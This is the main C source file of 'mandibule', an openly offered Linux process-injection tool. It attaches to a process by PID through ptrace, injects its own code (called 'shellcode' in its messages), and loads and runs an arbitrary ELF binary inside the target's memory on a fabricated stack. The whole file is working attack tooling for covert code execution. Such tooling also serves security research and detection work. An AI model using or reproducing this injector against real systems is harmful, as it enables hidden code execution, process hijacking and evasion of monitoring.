// ======================================================================== //
// author:  ixty                                                       2018 //
// project: mandibule                                                       //
// licence: beerware                                                        //
// ======================================================================== //

// only c file of our code injector
// it includes directly all other code to be able to wrap all generated code
// between start/end boundaries

#include <stdint.h>
#include <stdlib.h>
#include <stdarg.h>
#include <linux/unistd.h>

// first function in generated code - returns its own address aligned to page size
unsigned long mandibule_beg(int aligned)
{
    if(!aligned)
        return (unsigned long)mandibule_beg;
    return (unsigned long)mandibule_beg - ((unsigned long)mandibule_beg % 0x1000);
}

// include minimal inline c runtime + support code
#include "icrt.h"
#include "elfload.h"
#include "fakestack.h"
#include "ptinject.h"
#include "shargs.h"

// forward declarations
unsigned long mandibule_end(void);
void _main(unsigned long * sp);
void payload_loadelf(ashared_t * args);

// small macro for print + exit
#define error(...) do { printf(__VA_ARGS__); _exit(1); } while(0)

// define injected code entry point - which calls payload_main()
INJ_ENTRY(payload_start, payload_main)

// define injector entry point - which calls main()
void _start(void)
{
    CALL_SP(_main);
}

// show program usage & exit
void usage(char * argv0, char * msg)
{
    if(msg)
        printf("error: %s\n\n", msg);

    printf("usage: %s <elf> [-a arg]* [-e env]* [-m addr] <pid>\n", argv0);
    printf("\n");
    printf("loads an ELF binary into a remote process.\n");
    printf("\n");
    printf("arguments:\n");
    printf("    - elf: path of binary to inject into <pid>\n");
    printf("    - pid: pid of process to inject into\n");
    printf("\n");
    printf("options:\n");
    printf("    -a arg: argument to send to injected program - can be repeated\n");
    printf("    -e env: environment value sent to injected program - can be repeated\n");
    printf("    -m mem: base address at which program is loaded in remote process, default=AUTO\n");
    printf("\n");
    printf("Note: order of arguments must be respected (no getopt sry)\n");
    printf("\n");
    _exit(1);
}

// injector main code
void _main(unsigned long * sp)
{
    // argument parsing stuff
    int             ac          = *sp;
    char **         av          = (char **)(sp + 1);
    ashared_t *     args        = NULL;

    // injection vars
    void *          inj_addr    = (void*)mandibule_beg(1);
    size_t          inj_size    = mandibule_end() - (unsigned long)inj_addr;
    size_t          inj_off     = (size_t)payload_start - (size_t)inj_addr;
    size_t          inj_opts    = mandibule_beg(0) - mandibule_beg(1);
    uint8_t *       inj_code    = malloc(inj_size);

    // parse arguments & build shared arguments struct
    args = _ashared_parse(ac, av);
    if(inj_opts < args->size_used)
        error("> shared arguments too big (%d/ max %d)\n", args->size_max, inj_opts);

    // prepare code that will be injected into the process
    if(!inj_code)
        error("> malloc for injected code failed\n");
    memcpy(inj_code, inj_addr, inj_size);
    memcpy(inj_code, args, args->size_used);

    // self injection test
    if(args->pid == 0)
    {
        args->pid = _getpid();
        printf("> self inject pid: %d - bypassing ptrace altogether\n", args->pid);
        payload_loadelf(args);
    }
    else
    {
        // inject our own code into <pid> & execute code at <inj_off>
        if(pt_inject(args->pid, inj_code, inj_size, inj_off) < 0)
            error("> failed to inject shellcode into pid %d\n", args->pid);

        printf("> successfully injected shellcode into pid %d\n", args->pid);
    }
    _exit(0);
}

void payload_loadelf(ashared_t * args)
{
    char            pids[24];
    char            path[256];
    uint8_t *       auxv_buf;
    size_t          auxv_len;
    char **         av;
    char **         env;
    uint8_t         fakestack[4096 * 16];
    uint8_t *       stackptr = fakestack + sizeof(fakestack);
    unsigned long   eop;
    unsigned long   base_addr;

    // convert pid to string
    if(fmt_num(pids, sizeof(pids), args->pid, 10) < 0)
        return;

    // read auxv
    memset(path, 0, sizeof(path));
    strlcat(path, "/proc/", sizeof(path));
    strlcat(path, pids,     sizeof(path));
    strlcat(path, "/auxv",  sizeof(path));
    if(read_file(path, &auxv_buf, &auxv_len) < 0)
        return;
    printf("> auxv len: %d\n", auxv_len);

    // build argv from args
    av = malloc((args->count_arg + 1) * sizeof(char*));
    memset(av, 0, (args->count_arg + 1) * sizeof(char*));
    for(int i=0; i<args->count_arg; i++)
        av[i] = _ashared_get(args, i, 1);

    // build envp from args
    env = malloc((args->count_env + 1) * sizeof(char*));
    for(int i=0; i<args->count_env; i++)
        env[i] = _ashared_get(args, i, 0);

    // autodetect binary mapping address?
    base_addr = args->base_addr == -1 ? get_mapmax(args->pid) : args->base_addr;
    printf("> mapping '%s' into memory at 0x%lx\n", av[0], base_addr);

    // load the elf into memory!
    if(map_elf(av[0], base_addr, (unsigned long *)auxv_buf, &eop) < 0)
         error("> failed to load elf\n");

    // build a stack for loader entry
    memset(fakestack, 0, sizeof(fakestack));
    stackptr = fake_stack(stackptr, args->count_arg, av, env, (unsigned long *)auxv_buf);

    // all done
    printf("> starting ...\n\n");
    FIX_SP_JMP(stackptr, eop);

    // never reached if everything goes well
    printf("> returned from loader\n");
    free(auxv_buf);
    free(av);
    free(env);
    _exit(1);
}

// main function for injected code
// executed in remote process
void payload_main(void)
{
    // get the arguments from memory
    // we overwrite the ELF header with the arguments for the injected copy of our code
    ashared_t * args = (ashared_t*)mandibule_beg(1);
    _ashared_print(args);

    // load elf into memory
    payload_loadelf(args);
    _exit(0);
}

// must be the last function in the .c file
unsigned long mandibule_end(void)
{
    uint8_t * p = (uint8_t*)"-= end_rodata =-";
    p += 0x1000 - ((unsigned long)p % 0x1000);
    return (unsigned long)p;
}
